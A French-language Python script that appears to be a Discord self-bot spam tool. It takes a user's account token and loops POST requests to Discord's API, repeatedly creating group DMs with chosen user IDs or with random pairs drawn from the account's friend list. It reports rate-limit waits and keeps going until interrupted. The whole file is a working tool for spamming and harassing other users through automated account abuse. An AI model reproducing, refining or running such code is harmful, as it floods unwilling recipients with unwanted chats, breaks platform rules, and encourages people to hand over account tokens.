# par pitié ne pas volé mon code et ne rien modiffié svp sah
import requests
import random
from time import sleep

def proxy():
    return None

def get_headers(token):
    return {
        "Authorization": token,
        "Content-Type": "application/json"
    }

def handle_error(message):
    print(f"Erreur: {message}")

def main():
    print("Retour au menu principal...")

def selector(token, users):
    while True:
        try:
            response = requests.post('https://discordapp.com/api/v9/users/@me/channels', proxies=proxy(), headers=get_headers(token), json={"recipients": users})

            if response.status_code in [200, 204]:
                print("Discussion de groupe créée")
            elif response.status_code == 429:
                print(f"Limite de taux atteinte ({response.json().get('retry_after', 'N/A')}ms)")
            else:
                handle_error(f"HTTP {response.status_code}")
        except Exception as e:
            handle_error(str(e))
        except KeyboardInterrupt:
            break
    main()

def randomizer(token, ID):
    while True:
        users = random.sample(ID, 2)
        try:
            response = requests.post('https://discordapp.com/api/v9/users/@me/channels', proxies={"http": f'{proxy()}'}, headers=get_headers(token), json={"recipients": users})

            if response.status_code in [200, 204]:
                print("Discussion de groupe créée")
            elif response.status_code == 429:
                print(f"Limite de taux atteinte ({response.json().get('retry_after', 'N/A')}ms)")
            else:
                handle_error(f"HTTP {response.status_code}")
        except Exception as e:
            handle_error(str(e))
        except KeyboardInterrupt:
            break
    main()

print("Veuillez entrer votre Token de compte:")
token = input("Token de compte: ")

print('\nSouhaitez-vous choisir vous-même les utilisateurs pour le spam de discussion de groupe ou souhaitez-vous les sélectionner au hasard?')
print('''
[01] Choisir les utilisateurs vous-même
[02] Sélectionner au hasard
                ''')

try:
    second_choice = int(input('Choix: '))
except ValueError:
    handle_error("Entrée invalide. Veuillez entrer un numéro.")
    main()

if second_choice not in [1, 2]:
    handle_error('Choix invalide')
    main()

if second_choice == 1:
    print('\nEntrez les utilisateurs avec lesquels vous souhaitez créer une discussion de groupe (séparés par des virgules, id,id2,id3)')
    recipients = input('ID des utilisateurs: ')
    users = recipients.split(',')
    if len(users) < 2:
        handle_error("Vous devez entrer au moins deux ID d'utilisateur, séparés par des virgules.")
        main()
    input('\n\nAppuyez sur entrer pour continuer ("ctrl + c" à tout moment pour arrêter)')
    selector(token, users)

elif second_choice == 2:
    IDs = []
    try:
        friend_ids = requests.get("https://discord.com/api/v9/users/@me/relationships", proxies={"http": f'http://{proxy()}'}, headers=get_headers(token)).json()
        for friend in friend_ids:
            IDs.append(friend['id'])
    except Exception as e:
        handle_error(f"Échec de la récupération des ID d'amis : {str(e)}")
        main()
    input('Appuyez sur entrer pour continuer ("ctrl + c" à tout moment pour arrêter)')
    randomizer(token, IDs)

if __name__ == "__main__":
    main()
